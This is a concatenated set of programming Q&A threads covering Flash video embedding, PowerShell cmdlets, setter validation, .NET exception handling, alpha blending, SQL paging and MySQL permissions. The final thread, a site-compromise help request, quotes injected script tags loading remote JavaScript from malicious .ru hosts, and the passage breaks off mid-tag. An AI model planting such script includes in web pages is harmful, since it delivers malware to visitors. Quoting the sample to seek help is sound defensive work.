['A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?', \"Flash is certainly the most ubiquitous and portable solution.  98% of browsers have Flash installed.  Other alternatives are Quicktime, Windows Media Player, or even Silverlight (Microsoft's Flash competitor, which can be used to embed several video formats).\\r\\n\\r\\nI would recommend using Flash (and it's FLV video file format) for embedding your video unless you have very specific requirements as far as video quality or DRM.\", 'Flash is usually the product of choice: Everyone has it, and using the JW FLV Player makes it relatively easy on your side.\\r\\n\\r\\nAs for other Video Formats, there are WMV and QuickTime, but the players are rather \"heavy\", not everyone might have them and they feel so 1990ish...\\r\\n\\r\\nReal Player... Don\\'t let me even start ranting about that pile of ...\\r\\n\\r\\nThe only other alternative of Flash that I would personally consider is Silverlight, which allows streaming WMV Videos. I found the production of WMV much better and easier than FLV because all Windows FLV Encoders I tried are not really good and stable, whereas pretty much every tool can natively output WMV. The problem with Silverlight is that no one has that Browser Plugin (yet?). There is also a player from JW.', 'I have worked for a company that developed a system for distributing media content to dedicated \"players\". It was web based and used ASP.NET technology and have tried almost every possible media format you can think of and your choice really comes down to asking yourself:\\r\\n\\r\\ndoes it needs to play directly out of the box, or can I make sure that the components required to play the videos can be installed beforehand?\\r\\n\\r\\nIf your answer is that it needs to play out of the box then really your only option is flash (I know that it is not installed by default, but most will already have it installed)\\r\\n\\r\\nIf it is not a big issue that extra components are needed then you can go with formats that are supported by windows media player\\r\\n\\r\\nThe reason why windows media player falls into the second option is because for some browsers and some formats extra components must be installed.\\r\\n\\r\\nWe had the luxury that the \"players\" were provided by us, so we could go for the second option, however even we tried to convert as much as possible back to flash because it handles way better than windows media player', \"One consideration would be whether video playback is via progressive download or streaming. If it's progressive download, then I would say use Flash because you get a wider audience reach.\\n\\nFor streaming wmv, it is out of the box functionality provided by Windows Media Services\\n\\nFor streaming flash, you will have to install a streaming server on your Windows box. Some options are:\\n\\n\\nAdobe Flash Media Server (Commercial)\\nWowza Media Server (Free/Commercial) \\nRed5 Flash Server (Open Source)\\n\\n\", '&lt;object width=\"660\" height=\"525\"&gt;&lt;param name=\"movie\" value=\"http://www.youtube.com/v/WAQUskZuXhQ&amp;hl=en&amp;fs=1&amp;color1=0x006699&amp;color2=0x54abd6&amp;border=1\"&gt;&lt;/param&gt;&lt;param name=\"allowFullScreen\" value=\"true\"&gt;&lt;/param&gt;&lt;param name=\"allowscriptaccess\" value=\"always\"&gt;&lt;/param&gt;&lt;embed src=\"http://www.youtube.com/v/WAQUskZuXhQ&amp;hl=en&amp;fs=1&amp;color1=0x006699&amp;color2=0x54abd6&amp;border=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"660\" height=\"525\"&gt;&lt;/embed&gt;&lt;/object&gt;\\n\\n', '\"Does the choice of ASP.NET as a platform influence this decision?\"\\n\\nProbably not.\\n', \"If you have access to Microsoft Expression Encoder 2, you can use that to encode a video file and generate a Silverlight video player. Then if you have IIS 7, you can use Adaptive or Smooth Streaming also checkout Smooth HD for a really cool example. \\n\\nYou can also do streaming from the free Microsoft Silverlight Streaming Service. It's connected to a Windows Live account.\\n\\nA consideration is that the client will need to have Silverlight installed, just like Flash, but Flash has been around longer.\\n\"], ['I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?\\n', 'While semi-related to your question, it does not entirely fit the Powershell NetCmdlets motif. But I wanted to post it anyhow as I use it daily and it may help others. Simply making shift-control-c key combo into displaying the visual studio command prompt. ', \"I wrote a PowerShell provider to give me access to IE7's RSS feed store, and had lots of fun with it. It lets me cd to a drive called feed: and navigate around folders and feeds using cd and dir. It even lets you add or remove feeds from the command line. \\n\\nSee this post on my blog as an example:\\n\\nGetting the Most Prolific Authors in your Feeds\\n\\nIt's rolled up into the PowerShell Community Extensions project nowadays, which you can find on CodePlex here.\\n\", 'there\\'s an out-twitter script i use for posting to twitter. it\\'s nice, as it means you can send something to twitter without the risk of being distracted by a browser.\\r\\n\\r\\ni added an alias for it, \"twit\".\\r\\n\\r\\nso now you can type, for example:\\r\\n\\r\\nPS C:\\\\&gt;\"trying out stack overflow\" | twit\\r\\n\\r\\nand if successfully lodged, it will return an integer that identifies your post.', \"While it is not as fun as Out-Twitter, my favorite cmdlet is Get-Member, since it allows me to examine any of the objects I'm working with and find out new properties and methods, as well as the underlying type of the object.\\n\\nIf I did not choose Get-Member, I would have to go with Out-Clipboard from the PowerShell Community Extensions (PSCX), as it enables a whole lot of clipboard automation and makes using PowerShell for code templating much easier.\\n\", 'Well it is a little bland, but I would vote for Get-Help.\\n', 'ls (Get-ChildItem)\\nrm (Remove-Item)\\nps (Get-Process)\\n\\nand the rest of my familiar commands that now \"just work\" :)\\n\\nbut seriously... New-Object would have to get my vote.  With it, powershell can do ANYTHING :)\\n', 'As a programmer/hacker, Get-Member and Get-Command are the ones I use more than any others, but the ones I use to show off are Select-Control and Send-Keys from WASP, the PowerGadgets, and some of my own stuff written in WPF against CTP2 or PoshConsole ;-)\\n\\n\\n', \"Get-Member, hands down. No, it's not very glamorous, but the ability to inspect objects interactively beats interrupting your work to go hit up MSDN.\\n\", \"I find Get-member to be the most useful native PowerShell cmdlet. I also use Get-WMIObject on a daily basis.  Even if I'm troubleshooting a VBScript problem for someone I'll turn to Get-WMIObject because I can work with WMI interactively.\\n\", 'Set-Clipboard, found on the PowerShell Community Extensions project on CodePlex. Usually when I\\'m working in PowerShell, the ultimate goal is to generate some text or even an Excel spreadsheet. Set-Clipboard eliminates all of the intermediate \"save it to a file, ok now open that file, select all, copy to clipboard\" steps--you do it all in PowerShell.\\n', 'The combination of Get-WMIObject and Get-Member is something I use throughout the workday.  Working on Get-Sandwich.\\n', 'export-csv. This creates a nice report in a manager-friendly Excel-ready format. Bonus points if you have community extensions installed and user send-smtpmail. \\n\\nManagement report in their inbox from the commandline. Nice.\\n', 'I do alot of work with Microsoft Lync 2010 which includes a set of synthetic for testing functionality. Of these Test-CsPstnOutboundCall is my favourite.\\n\\nFor general scripting got to vote for get-member and get-help :)\\n'], [\"I'm wondering if it's a good idea to make verifications in getters and setters, or elsewhere in the code.\\n\\nThis might surprise you be when it comes to optimizations and speeding up the code, I think you should not make verifications in getters and setters, but in the code where you're updating your files or database. Am I wrong?\\n\", \"Validation should be captured separately from getters or setters in a validation method.  That way if the validation needs to be reused across multiple components, it is available.\\r\\n\\r\\nWhen the setter is called, such a validation service should be utilized to sanitize input into the object.  That way you know all information stored in an object is valid at all times.\\r\\n\\r\\nYou don't need any kind of validation for the getter, because information on the object is already trusted to be valid.\\r\\n\\r\\nDon't save your validation until a database update!! It is better to fail fast.\", \"From the perspective of having the most maintainable code, I think you should do as much validation as you can in the setter of a property. This way you won't be caching or otherwise dealing with invalid data.\\r\\n\\r\\nAfter all, this is what properties are meant for. If all you have is a bunch of properties like...\\r\\n\\r\\npublic string Name\\r\\n{\\r\\n    get\\r\\n    {\\r\\n        return _name;\\r\\n    }\\r\\n    set\\r\\n    {\\r\\n        _name = value;\\r\\n    }\\r\\n}\\r\\n\\r\\n\\r\\n... they might as well be fields\", 'It depends.\\r\\n\\r\\nGenerally, code should fail fast. If the value can be set by multiple points in the code and you validate only on after retrieving the value, the bug appears to be in the code that does the update. If the setters validate the input, you know what code is trying to set invalid values.', 'Well, one of the reaons why classes usually contain private members with public getters/setters is exactly because they can verify data.\\r\\n\\r\\nIf you have a Number than can be between 1 and 100, i would definitely put something in the setter that validates that and then maybe throw an exception that is being caught by the code. The reason is simple: If you don\\'t do it in the setter, you have to remember that 1 to 100 limitation every time you set it, which leads to duplicated code or when you forget it, it leads to an invalid state.\\r\\n\\r\\nAs for performance, i\\'m with Knuth here:\\r\\n\\r\\n\\r\\n  \"We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil.\"\\r\\n', 'You might wanna check out Domain Driven Design, by Eric Evans. DDD has this notion of  a Specification:\\r\\n\\r\\n\\r\\n  ... explicit predicate-like VALUE\\r\\n  OBJECTS for specialized purposes. A\\r\\n  SPECIFICATION is a predicate that\\r\\n  determines if an object does or does\\r\\n  not satisfy some criteria.\\r\\n\\r\\n\\r\\nI think failing fast is one thing, the other is where to keep the logic for validation. The domain is the right place to keep the logic and I think a Specification Object or a validate method on your Domain objects would be a good place.', 'I like to implement IDataErrorInfo and put my validation logic in its Error and this[columnName] properties. That way if you want to check programmatically whether there\\'s an error you can simply test either of those properties in code, or you can hand the validation off to the data binding in Web Forms, Windows Forms or WPF. \\r\\nWPF\\'s \"ValidatesOnDataError\" Binding property makes this particularly easy.', \"@Terrapin, re:\\r\\n\\r\\n\\r\\n  If all you have is a bunch of [simple\\r\\n  public set/get] properties ... they\\r\\n  might as well be fields\\r\\n\\r\\n\\r\\nProperties have other advantages over fields. They're a more explicit contract, they're  serialized, they can be debugged later, they're a nice place for extension through inheritance. The clunkier syntax is an accidental complexity -- .net 3.5 for example overcomes this.\\r\\n\\r\\nA common (and flawed) practice is to start with public fields, and turn them into properties later, on an 'as needed' basis. This breaks your contract with anyone who consumes your class, so it's best to start with properties.\", \"I try to never let my objects enter an invalid state, so setters definitely would have validation as well as any methods that change state.  This way, I never have to worry that the object I'm dealing with is invalid.  If you keep your methods as validation boundaries, then you never have to worry about validation frameworks and IsValid() method calls sprinkled all over the place.\\n\"], [\"When working on ASP.NET 1.1 projects I always used the Global.asax to catch all errors. I'm looking for a similar way to catch all exceptions in a Windows Forms user control, which ends up being a hosted IE control. What is the proper way to go about doing something like this?\\n\", 'You need to handle the System.Windows.Forms.Application.ThreadException event for Windows Forms. This article really helped me: http://bytes.com/forum/thread236199.html.\\n', 'If you\\'re using VB.NET, you can tap into the very convenient ApplicationEvents.vb.  This file comes for free with a VB.NET WinForms project and contains a method for handling unhandled exceptions.\\r\\n\\r\\nTo get to this nifty file, it\\'s \"Project Properties &gt;&gt; Application &gt;&gt; Application Events\"\\r\\n\\r\\nIf you\\'re not using VB.NET, then yeah, it\\'s handling Application.ThreadException.', 'Currently in my winforms app I have handlers for Application.ThreadException, as above, but also AppDomain.CurrentDomain.UnhandledException\\r\\n\\r\\nMost exceptions arrive via the ThreadException handler, but the AppDomain one has also caught a few in my experience', 'Code from MSDN: http://msdn.microsoft.com/en-us/library/system.appdomain.unhandledexception.aspx?cs-save-lang=1&amp;cs-lang=vb#code-snippet-2\\n\\nSub Main()\\n  Dim currentDomain As AppDomain = AppDomain.CurrentDomain\\n  AddHandler currentDomain.UnhandledException, AddressOf MyHandler\\n\\n  Try \\n     Throw New Exception(\"1\")\\n  Catch e As Exception\\n     Console.WriteLine(\"Catch clause caught : \" + e.Message)\\n     Console.WriteLine()\\n  End Try \\n\\n  Throw New Exception(\"2\")\\nEnd Sub \\n\\nSub MyHandler(sender As Object, args As UnhandledExceptionEventArgs)\\n  Dim e As Exception = DirectCast(args.ExceptionObject, Exception)\\n  Console.WriteLine(\"MyHandler caught : \" + e.Message)\\n  Console.WriteLine(\"Runtime terminating: {0}\", args.IsTerminating)\\nEnd Sub \\n\\n', 'To Handle Exceptions Globally...\\n\\nWindows Application\\n\\nSystem.Windows.Forms.Application.ThreadException event\\n\\nGenerally Used in Main Method. Refer MSDN Thread Exception\\n\\nAsp.Net\\n\\nSystem.Web.HttpApplication.Error event\\n\\nNormally Used in Global.asax file. Refer MSDN Global.asax Global Handlers\\n\\nConsole Application\\n\\nSystem.AppDomain.UnhandledException event\\n\\nGenerally used in Main Method. Refer MSDN UnhandledException \\n'], [\"Let's say that we have an ARGB color:\\n\\nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.\\n\\n\\nWhen this is painted on top of an existing color, the colors will blend. So when it is blended with white, the resulting color is Color.FromARGB(255, 162, 133, 255);\\n\\nThe solution should work like this:\\n\\nColor blend = Color.White; \\nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.      \\nColor rgb = ToRGB(argb, blend); //Same as Color.FromARGB(255, 162, 133, 255);\\n\\n\\nWhat is ToRGB's implementation?      \\n\", \"It's called alpha blending.\\r\\n\\r\\nIn psuedocode, assuming the background color (blend) always has 255 alpha. Also assumes alpha is 0-255.\\r\\n\\r\\nalpha=argb.alpha()r = (alpha/255)*argb.r() + (1 - alpha/255)*blend.r()g = (alpha/255)*argb.g() + (1 - alpha/255)*blend.g()b = (alpha/255)*argb.b() + (1 - alpha/255)*blend.b()\\r\\n\\r\\nnote: you probably need to be a bit (more) careful about floating-point/int math and rounding issues, depending on language. Cast intermediates accordingly\\r\\n\\r\\nEdited to add:\\r\\n\\r\\nIf you don't have a background color with an alpha of 255, the algebra gets alot more complicated. I've done it before and it's a fun exercise left to the reader (if you really need to know, ask another question :). \\r\\n\\r\\nIn other words, what color C blends into some background the same as blending A, then blending B. This is sort of like calculating A+B (which isn't the same as B+A).\", \"if you don't need to know this pre-render, you could always use the win32 method of getpixel, I believe. \\r\\n\\r\\nNote: typing on iPhone in the middle of Missouri with no inet access. Will look up real win32 example and see if there is a .net equivalent.\\r\\n\\r\\nIn case anyone cares, and doesn't want to use the (excellent) answer posted above, you can get the color value of a pixel in .Net via this link MSDN example\", 'I know this is an old thread, but I want to add this:\\n\\nPublic Shared Function AlphaBlend(ByVal ForeGround As Color, ByVal BackGround As Color) As Color\\n    If ForeGround.A = 0 Then Return BackGround\\n    If BackGround.A = 0 Then Return ForeGround\\n    If ForeGround.A = 255 Then Return ForeGround\\n    Dim Alpha As Integer = CInt(ForeGround.A) + 1\\n    Dim B As Integer = Alpha * ForeGround.B + (255 - Alpha) * BackGround.B &gt;&gt; 8\\n    Dim G As Integer = Alpha * ForeGround.G + (255 - Alpha) * BackGround.G &gt;&gt; 8\\n    Dim R As Integer = Alpha * ForeGround.R + (255 - Alpha) * BackGround.R &gt;&gt; 8\\n    Dim A As Integer = ForeGround.A\\n\\n    If BackGround.A = 255 Then A = 255\\n    If A &gt; 255 Then A = 255\\n    If R &gt; 255 Then R = 255\\n    If G &gt; 255 Then G = 255\\n    If B &gt; 255 Then B = 255\\n\\n    Return Color.FromArgb(Math.Abs(A), Math.Abs(R), Math.Abs(G), Math.Abs(B))\\nEnd Function\\n\\npublic static Color AlphaBlend(Color ForeGround, Color BackGround)\\n{\\n    if (ForeGround.A == 0)\\n        return BackGround;\\n    if (BackGround.A == 0)\\n        return ForeGround;\\n    if (ForeGround.A == 255)\\n        return ForeGround;\\n\\n    int Alpha = Convert.ToInt32(ForeGround.A) + 1;\\n    int B = Alpha * ForeGround.B + (255 - Alpha) * BackGround.B &gt;&gt; 8;\\n    int G = Alpha * ForeGround.G + (255 - Alpha) * BackGround.G &gt;&gt; 8;\\n    int R = Alpha * ForeGround.R + (255 - Alpha) * BackGround.R &gt;&gt; 8;\\n    int A = ForeGround.A;\\n\\n    if (BackGround.A == 255)\\n        A = 255;\\n    if (A &gt; 255)\\n        A = 255;\\n    if (R &gt; 255)\\n        R = 255;\\n    if (G &gt; 255)\\n        G = 255;\\n    if (B &gt; 255)\\n        B = 255;\\n\\n    return Color.FromArgb(Math.Abs(A), Math.Abs(R), Math.Abs(G), Math.Abs(B));\\n}\\n\\n'], [\"How do I page results in SQL Server 2005?\\n\\nI tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\\n\\nWhat I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\\n\\nAny help would be much appreciated.\\n\", 'You can use the Row_Number() function.\\nIts used as follows:\\n\\nSELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\\nFROM Users\\n\\n\\nFrom which it will yield a result set with a RowID field which you can use to page between.\\n\\nSELECT * \\nFROM \\n    ( SELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\\n      FROM Users \\n    ) As RowResults\\nWHERE RowID Between 5 AND 10\\n\\n\\netc\\n', \"I believe you'd need to perform a separate query to accomplish that unfortionately.\\r\\n\\r\\nI was able to accomplish this at my previous position using some help from this page:\\r\\nPaging in DotNet 2.0\\r\\n\\r\\nThey also have it pulling a row count seperately.\", 'Here\\'s what I do for paging:  All of my big queries that need to be paged are coded as inserts into a temp table.  The temp table has an identity field that will act in a similar manner to the row_number() mentioned above.  I store the number of rows in the temp table in an output parameter so the calling code knows how many total records there are.  The calling code also specifies which page it wants, and how many rows per page, which are selected out from the temp table.\\n\\nThe cool thing about doing it this way is that I also have an \"Export\" link that allows you to get all rows from the report returned as CSV above every grid in my application.  This link uses the same stored procedure: you just return the contents of the temp table instead of doing the paging logic.  This placates users who hate paging, and want to see everything, and want to sort it in a million different ways.\\n', \"If you're trying to get it in one statement (the total plus the paging).  You might need to explore SQL Server support for the partition by clause (windowing functions in ANSI SQL terms).  In Oracle the syntax is just like the example above using row_number(), but I have also added a partition by clause to get the total number of rows included with each row returned in the paging (total rows is 1,262):\\n\\nSELECT rn, total_rows, x.OWNER, x.object_name, x.object_type\\n  FROM (SELECT COUNT (*) OVER (PARTITION BY owner) AS TOTAL_ROWS,\\n               ROW_NUMBER () OVER (ORDER BY 1) AS rn, uo.*\\n          FROM all_objects uo\\n         WHERE owner = 'CSEIS') x\\n WHERE rn BETWEEN 6 AND 10\\n\\n\\nNote that I have where owner = 'CSEIS' and my partition by is on owner.  So the results are:\\n\\nRN  TOTAL_ROWS  OWNER   OBJECT_NAME OBJECT_TYPE\\n6   1262    CSEIS   CG$BDS_MODIFICATION_TYPES   TRIGGER\\n7   1262    CSEIS   CG$AUS_MODIFICATION_TYPES   TRIGGER\\n8   1262    CSEIS   CG$BDR_MODIFICATION_TYPES   TRIGGER\\n9   1262    CSEIS   CG$ADS_MODIFICATION_TYPES   TRIGGER\\n10  1262    CSEIS   CG$BIS_LANGUAGES    TRIGGER\\n\\n\", \"When I need to do paging, I typically use a temporary table as well.  You can use an output parameter to return the total number of records.  The case statements in the select allow you to sort the data on specific columns without needing to resort to dynamic SQL.\\n\\n--Declaration--\\n\\n--Variables\\n@StartIndex INT,\\n@PageSize INT,\\n@SortColumn VARCHAR(50),\\n@SortDirection CHAR(3),\\n@Results INT OUTPUT\\n\\n--Statements--\\nSELECT @Results = COUNT(ID) FROM Customers\\nWHERE FirstName LIKE '%a%'\\n\\nSET @StartIndex = @StartIndex - 1 --Either do this here or in code, but be consistent\\nCREATE TABLE #Page(ROW INT IDENTITY(1,1) NOT NULL, id INT, sorting_1 SQL_VARIANT, sorting_2 SQL_VARIANT)\\nINSERT INTO #Page(ID, sorting_1, sorting_2)\\nSELECT TOP (@StartIndex + @PageSize)\\n    ID,\\n    CASE\\n    \\tWHEN @SortColumn='FirstName' AND @SortDirection='ASC' THEN CAST(FirstName AS SQL_VARIANT)\\n    \\tWHEN @SortColumn='LastName' AND @SortDirection='ASC' THEN CAST(LastName AS SQL_VARIANT)\\n    \\tELSE NULL\\n    END AS sort_1,\\n    CASE\\n    \\tWHEN @SortColumn='FirstName' AND @SortDirection='DES' THEN CAST(FirstName AS SQL_VARIANT)\\n    \\tWHEN @SortColumn='LastName' AND @SortDirection='DES' THEN CAST(LastName AS SQL_VARIANT)\\n    \\tELSE NULL\\n    END AS sort_2\\nFROM (\\n    SELECT\\n    \\tCustomerId AS ID,\\n    \\tFirstName,\\n    \\tLastName\\n    FROM Customers\\n    WHERE\\n    \\tFirstName LIKE '%a%'\\n) C\\nORDER BY sort_1 ASC, sort_2 DESC, ID ASC;\\n\\nSELECT\\n    ID,\\n    Customers.FirstName,\\n    Customers.LastName\\nFROM #Page\\nINNER JOIN Customers ON\\n    ID = Customers.CustomerId\\nWHERE ROW &gt; @StartIndex AND ROW &lt;= (@StartIndex + @PageSize)\\nORDER BY ROW ASC\\n\\nDROP TABLE #Page\\n\\n\", \"The accepted answer for this doesn't actually work for me...I had to jump through one more hoop to get it to work.\\n\\nWhen I tried the answer\\n\\nSELECT Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\\nFROM Users\\nWHERE RowID Between 0 AND 9\\n\\n\\nit failed, complaining that it didn't know what RowID was.\\n\\nI had to wrap it in an inner select like this:\\n\\nSELECT * \\nFROM\\n    (SELECT\\n    Row_Number() OVER(ORDER BY UserName) As RowID, UserFirstName, UserLastName\\n    FROM Users\\n    ) innerSelect\\nWHERE RowID Between 0 AND 9\\n\\n\\nand then it worked.\\n\"], ['I am getting the following error:\\n\\n\\n  Access denied for user \\'apache\\'@\\'localhost\\' (using password: NO)\\n\\n\\nWhen using the following code:\\n\\n&lt;?php\\n\\ninclude(\"../includes/connect.php\");\\n\\n$query = \"SELECT * from story\";\\n\\n$result = mysql_query($query) or die(mysql_error());\\n\\necho \"&lt;h1&gt;Delete Story&lt;/h1&gt;\";\\n\\nif (mysql_num_rows($result) &gt; 0) {\\n    while($row = mysql_fetch_row($result)){\\n          echo \\'&lt;b&gt;\\'.$row[1].\\'&lt;/b&gt;&lt;span align=\"right\"&gt;&lt;a href=\"../process/delete_story.php?id=\\'.$row[0].\\'\"&gt;Delete&lt;/a&gt;&lt;/span&gt;\\';\\n      echo \\'&lt;br /&gt;&lt;i&gt;\\'.$row[2].\\'&lt;/i&gt;\\';\\n    }\\n}\\nelse {\\n   echo \"No stories available.\";\\n}\\n?&gt;\\n\\n\\nThe connect.php file contains my MySQL connect calls that are working fine with my INSERT queries in another portion of the software.  If I comment out the $result = mysql_query line, then it goes through to the else statement.  So, it is that line or the content in the if.\\n\\nI have been searching the net for any solutions, and most seem to be related to too many MySQL connections or that the user I am logging into MySQL as does not have permission.  I have checked both.  I can still perform my other queries elsewhere in the software, and I have verified that the account has the correct permissions.\\n', 'Just to check, if you use just this part you get an error?\\n\\n&lt;?php\\ninclude(\"../includes/connect.php\");\\n\\n$query = \"SELECT * from story\";\\n$result = mysql_query($query) or die(mysql_error());\\n\\n\\nIf so, do you still get an error if you copy and paste one of those Inserts into this page, I am trying to see if it\\'s local to the page or that actual line.\\n\\nAlso, can you post a copy of the connection calls (minus passwords), unless the inserts use exactly the same syntax as this example.\\n', 'Does the apache user require a password to connect to the database?  If so, then the fact that it says \"using password: NO\" would lead me to believe that the code is trying to connect without a password.\\r\\n\\r\\nIf, however, the apache user doesn\\'t require a password, a double-check of the permissions may be a good idea (which you mentioned you already checked).  It may still be beneficial to try executing something like this at a mysql prompt:\\r\\n\\r\\n\\r\\n  GRANT ALL PRIVILEGES ON databasename.* to \\'apache\\'@\\'localhost\\';\\r\\n\\r\\n\\r\\nThat syntax should be correct.  \\r\\n\\r\\nOther than that, I\\'m just as stumped as you are.', 'If indeed you are able to insert using the same connection calls, your problem most likely lies in the user \"apache\" not having SELECT permissions on the database. If you have phpMyAdmin installed you can look at the permissions for the user in the Privileges pane. phpMyAdmin also makes it very easy to modify the permissions.\\r\\n\\r\\nIf you only have access to the command line, you can check the permissions from the mysql database.\\r\\n\\r\\nYou\\'ll probably need to do something like: \\r\\n\\r\\nGRANT SELECT ON myDatabase.myTable TO \\'apache\\'@\\'localhost\\';', '\\n  Just to check, if you use just this part you get an error?\\n  \\n  If so, do you still get an error if you copy and paste one of those Inserts into this >page, I am trying to see if it\\'s local to the page or that actual line.\\n  \\n  Also, can you post a copy of the connection calls (minus passwords), unless the inserts >use exactly the same syntax as this example.\\n\\n\\nHere is what is in the connection.php file.  I linked to the file through an include in the same fashion as where I execute the INSERT queries elsewhere in the code.\\n\\n$conn = mysql_connect(\"localhost\", ******, ******) or die(\"Could not connect\");\\nmysql_select_db(\"adbay_com_-_cms\") or die(\"Could not select database\");\\n\\n\\nI will try the working INSERT query in this area to check that out.\\n\\nAs to the others posting about the password access.  I did, as stated in my first posting, check permissions.  I used phpMyAdmin to verify that the permissions for the user account I was using were correct.  And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database.  I don\\'t have any user accounts with the name apache in them at all for that matter.\\n', \"\\r\\n  And if it matters at all, apache@localhost is not the name of the user account that I use to get into the database. I don't have any user accounts with the name apache in them at all for that matter.\\r\\n\\r\\n\\r\\nIf it is saying 'apache@localhost' the username is not getting passed correctly to the MySQL connection. 'apache' is normally the user that runs the httpd process (at least on Redhat-based systems) and if no username is passed during the connection MySQL uses whomever is calling for the connection.\\r\\n\\r\\nIf you do the connection right in your script, not in a called file, do you get the same error?\", 'Don\\'t forget to check your database error logs. You should be able to see if you are even hitting the DB. If you aren\\'t, you should check your firewall rules on the box. On a linux box you can run iptables -L to get the firewall list rules. \\n\\nOtherwise it will be a pure access issue. Do a \"select * from mysql.user\" to see if the apache user is even set up in there. Further, I would recommend creating an account specifically for your app as opposed to using apache, since any other app you create will run as apache by default, and could get unauthorized access to your db. \\n\\nJust look up \"GRANT\" in the documentation @ dev.mysql.com to get more info. If you have more specific questiosn regarding db, just edit your question, and i will take a look.\\n', \"Does the connect.php script actually make the connection or does it just define a function you need to call to create a connection? The error you're getting is symptomatic of not having a previously established connection at all.\\n\\nETA: Also change the include to a require. I suspect it's not actually including the file at all. But include can fail silently.\\n\", 'Change the include() to require(). If the \"connect.php\" file can\\'t be require()d, the script will fail with a fatal error, whereas include() only generates a warning. If the username you\\'re passing to mysql_connect() isn\\'t \"apache\", an incorrect path to the connect script is the most common way to get this type of error.\\n', 'Dude the answer is a big DUH! which unfortunately it took me a while to figure out as well. You probably have a function like dbconnect() and you are using variables from an include file to make the connection. $conn = mysql_connect($dbhost, $dbuser, $dbpass).\\n\\nWell since this is inside a function the variables from the include file need to be passed to the function or else the function will not know what $dbhost, $dbuser and $dbpass is. A way to fix this is to make those variables global so your functions can pick them up. Another solution which is not very secure would be to write out you host, user and pass in the mysql_connect function.\\n\\nHope this helps but I had the same problem.\\n', 'You can do one of the following:\\n\\n\\nAdd the user \"apache\" and setup its privileges from phpmyadmin or using mysql on a shell\\nTell php to run mysql_connect as another user, someone who already has the privileges needed (but maybe not root), look for mysql.default_user in your php.ini file.\\n\\n', \"Did you remember to do:\\n\\nflush privileges;\\n\\n\\nIf the user is not set up then it will give the 'apache'@'localhost' error.\\n\"], ['My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn\\'t technical at all, and built the whole thing with a WYSIWYG editor.\\n\\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\\n\\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that\\'s how it got hacked. We\\'ve changed his password to an 8+ digit non-word string (he wouldn\\'t go for a passphrase since he is a hunt-n-peck typer).\\n\\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\\n\\nI have no idea what to do at this point though as I\\'ve never dealt with this sort of thing before. Anyone have any suggestions?\\n\\nHe was using plain jane un-secured ftp through webhost4life.com. I don\\'t even see a way to do sftp on their site. I\\'m thinking his username and password got intercepted?\\n\\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\\n\\nFor the record, here is the line of code that \"magically\" got added to his file (and isn\\'t in his file on his computer -- I\\'ve left it commented out just to make absolute sure it won\\'t do anything on this page, although I\\'m sure Jeff would guard against this):\\n\\n&lt;!--script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.98hs.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.uhwc.ru/js.js&gt;&lt;/script&gt;&lt;script src=http://www.porv.ru/js.js&gt;&lt;/script&gt;&lt;script 